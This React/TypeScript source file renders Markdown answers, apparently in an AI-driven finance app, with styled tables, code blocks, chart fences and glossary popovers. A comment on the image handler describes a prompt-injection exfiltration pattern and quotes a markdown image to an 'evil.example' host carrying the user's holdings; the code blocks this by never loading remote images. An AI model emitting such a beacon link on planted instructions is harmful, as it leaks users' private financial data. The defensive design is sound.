"use client";
import React, { memo, useMemo, useState } from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import type { Components } from "react-markdown";
import ChartBlock from "./ChartBlock";
import { decorateGlossary } from "./answer/GlossaryTerm";
import { GlossaryMarks } from "@/lib/glossary";
import { glossarySeeds, splitMarkdownBlocks } from "@/lib/markdownBlocks";

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      onClick={() => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 1800); }}
      className="text-[length:var(--text-meta)] font-medium px-2 py-0.5 rounded-[var(--radius-xs)] transition-colors duration-150 hover:bg-[var(--color-surface)] text-[var(--color-text-secondary)] hover:text-[var(--color-text)]"
    >
      {copied ? "Copied!" : "Copy"}
    </button>
  );
}

export const components: Components = {
  // Tables — scrollable container + clean styling
  table: ({ children }) => (
    <div className="overflow-x-auto my-4 rounded-[var(--radius-md)] border border-[var(--color-border)]">
      <table className="w-full text-[length:var(--text-sm)] border-collapse">{children}</table>
    </div>
  ),
  thead: ({ children }) => <thead className="bg-[var(--color-accent-light)]">{children}</thead>,
  tbody: ({ children }) => <tbody className="divide-y divide-[var(--color-border)]">{children}</tbody>,
  tr: ({ children }) => <tr className="hover:bg-[var(--color-surface)] transition-colors duration-100">{children}</tr>,
  th: ({ children }) => (
    <th className="px-4 py-2.5 text-left text-[length:var(--text-micro)] font-semibold uppercase tracking-wider text-[var(--color-accent)] whitespace-nowrap border-b border-[var(--color-border)]">
      {children}
    </th>
  ),
  td: ({ children }) => (
    <td className="px-4 py-2.5 text-[length:var(--text-sm)] text-[var(--color-text)] align-top">
      {children}
    </td>
  ),

  // Code blocks — chart fence or dark code block with language badge + copy
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  code: ({ className, children, ...props }: any) => {
    const isBlock = !!className;
    const lang = className?.replace("language-", "") ?? "";
    const code = String(children).replace(/\n$/, "");

    if (!isBlock) {
      return (
        <code className="bg-[var(--color-accent-light)] text-[var(--color-accent)] px-1.5 py-0.5 rounded-[var(--radius-xs)] text-[0.82em] font-mono">
          {children}
        </code>
      );
    }

    // Chart blocks render as interactive Recharts visualisations
    if (lang === "chart") {
      return <ChartBlock raw={code} />;
    }

    return (
      <div className="my-4 rounded-[var(--radius-md)] overflow-hidden border border-[var(--color-border)] bg-[var(--color-surface-2)]">
        <div className="flex items-center justify-between px-4 py-2 border-b border-[var(--color-border)]">
          <span className="text-[length:var(--text-meta)] font-medium text-[var(--color-text-secondary)] uppercase tracking-wider">{lang || "code"}</span>
          <CopyButton text={code} />
        </div>
        <pre className="text-[var(--color-text)] px-4 py-3.5 overflow-x-auto text-[0.82em] leading-relaxed font-mono">
          <code {...props}>{children}</code>
        </pre>
      </div>
    );
  },

  // Headings — serif editorial style per design spec
  h1: ({ children }) => (
    <h1
      style={{ fontFamily: "var(--font-serif)", fontSize: "var(--text-xl)", fontWeight: 700, letterSpacing: "-0.012em", lineHeight: 1.28 }}
      className="text-[var(--color-text)] mt-6 mb-2 pb-1.5 border-b border-[var(--color-border)]"
    >
      {children}
    </h1>
  ),
  h2: ({ children }) => (
    <h2
      style={{ fontFamily: "var(--font-serif)", fontSize: "var(--text-lg)", fontWeight: 700, letterSpacing: "-0.012em", lineHeight: 1.28 }}
      className="text-[var(--color-text)] mt-5 mb-2"
    >
      {children}
    </h2>
  ),
  h3: ({ children }) => (
    <h3
      style={{ fontFamily: "var(--font-serif)", fontSize: "var(--text-title)", fontWeight: 700, letterSpacing: "-0.008em", lineHeight: 1.3 }}
      className="text-[var(--color-text-secondary)] mt-4 mb-1.5"
    >
      {children}
    </h3>
  ),

  // Lists
  ul: ({ children }) => <ul className="list-disc pl-5 my-2 space-y-1 text-[var(--color-text)]">{children}</ul>,
  ol: ({ children }) => <ol className="list-decimal pl-5 my-2 space-y-1 text-[var(--color-text)]">{children}</ol>,
  li: ({ children }) => <li className="text-[0.9rem] leading-relaxed">{children}</li>,

  // Paragraphs
  p: ({ children }) => <p className="text-[0.9rem] leading-[1.75] mb-3 last:mb-0 text-[var(--color-text)]">{children}</p>,

  // Inline text
  strong: ({ children }) => <strong className="font-semibold text-[var(--color-text)]">{children}</strong>,
  em: ({ children }) => <em className="italic text-[var(--color-text-secondary)]">{children}</em>,

  // Blockquote — callout style
  blockquote: ({ children }) => (
    <blockquote className="border-l-4 border-[var(--color-accent-medium)] bg-[var(--color-accent-light)] rounded-r-[var(--radius-md)] pl-4 pr-3 py-2.5 my-3 text-[var(--color-text-secondary)] text-[0.9rem]">
      {children}
    </blockquote>
  ),

  // Links
  a: ({ href, children }) => (
    <a href={href} target="_blank" rel="noopener noreferrer" className="text-[var(--color-accent)] underline underline-offset-2 hover:opacity-75 transition-opacity">
      {children}
    </a>
  ),

  // Horizontal rule
  hr: () => <hr className="my-4 border-none border-t border-[var(--color-border)]" />,

  // Images are never loaded. Answers are model text shaped by third-party content
  // (news, X posts, web search), and a remote <img> fires the moment it renders,
  // so `![](https://evil.example/?d=<holdings>)` would be a zero-click beacon that
  // ships the user's portfolio context to whoever planted the instruction. The
  // app never draws charts as images (```chart blocks do that), so nothing real
  // is lost; the placeholder names the host so a planted image is visible as one.
  img: ({ src, alt }) => {
    let host = "";
    try {
      host = new URL(String(src ?? "")).hostname;
    } catch {
      // relative or malformed — no host to show
    }
    return (
      <span className="text-[var(--color-muted)]">
        [image{alt ? `: ${alt}` : ""}{host ? ` · ${host}` : ""}]
      </span>
    );
  },
};

/**
 * The same component map, with the first mention of each jargon term wrapped in
 * a definition popover. One `GlossaryMarks` per rendered message, so a term is
 * underlined once however many times it appears.
 */
export function glossaryComponents(marks: GlossaryMarks): Components {
  const decorate = (children: React.ReactNode) => decorateGlossary(children, marks);
  return {
    ...components,
    p: ({ children }) => <p className="text-[0.9rem] leading-[1.75] mb-3 last:mb-0 text-[var(--color-text)]">{decorate(children)}</p>,
    li: ({ children }) => <li className="text-[0.9rem] leading-relaxed">{decorate(children)}</li>,
    td: ({ children }) => (
      <td className="px-4 py-2.5 text-[length:var(--text-sm)] text-[var(--color-text)] align-top">
        {decorate(children)}
      </td>
    ),
  };
}

interface Props {
  children: string;
  className?: string;
  style?: React.CSSProperties;
  /** Underline and define finance jargon on first mention (beginner/intermediate readers). */
  glossary?: boolean;
}

/**
 * One top-level block of an answer. Memoised on its text, so while an answer
 * streams only the block still being written re-renders; the finished ones
 * above it cost nothing. Renders no wrapper, so the blocks stay siblings and
 * `last:` spacing works as before.
 */
export const MarkdownBlock = memo(function MarkdownBlock({
  text,
  glossary,
  seed,
}: {
  text: string;
  glossary: boolean;
  /** Terms earlier blocks already marked, "|"-joined (a string so memo can compare it). */
  seed: string;
}) {
  const map = glossary ? glossaryComponents(new GlossaryMarks(seed ? seed.split("|") : [])) : components;
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm]} components={map}>
      {text}
    </ReactMarkdown>
  );
});

export default function Markdown({ children, className = "", style, glossary = false }: Props) {
  const blocks = useMemo(() => splitMarkdownBlocks(children), [children]);
  const seeds = useMemo(() => (glossary ? glossarySeeds(blocks) : null), [blocks, glossary]);
  return (
    <div className={`markdown-body ${className}`} style={style}>
      {blocks.map((text, i) => (
        // Index keys on purpose: a block keeps its slot as the answer grows.
        <MarkdownBlock key={i} text={text} glossary={glossary} seed={seeds?.[i].join("|") ?? ""} />
      ))}
    </div>
  );
}
